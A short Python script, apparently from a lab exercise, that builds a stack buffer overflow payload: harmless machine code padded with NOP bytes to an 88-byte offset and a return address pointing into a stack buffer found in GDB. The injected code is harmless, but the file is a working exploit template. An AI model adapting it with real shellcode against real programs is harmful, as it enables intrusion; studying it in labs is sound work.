import struct

# Benign machine code: mov eax, 42; ret
code = bytes.fromhex("b8 2a 00 00 00 c3")

# Buffer address observed in GDB
buffer_address = 0x7fffffffdf30

# Distance from buffer to saved return address
offset = 88

# Construct 96-byte payload
payload = code.ljust(offset, b"\x90")
payload += struct.pack("<Q", buffer_address)

with open("shellcode_payload.bin", "wb") as f:
    f.write(payload)

print(f"Generated payload: {len(payload)} bytes")
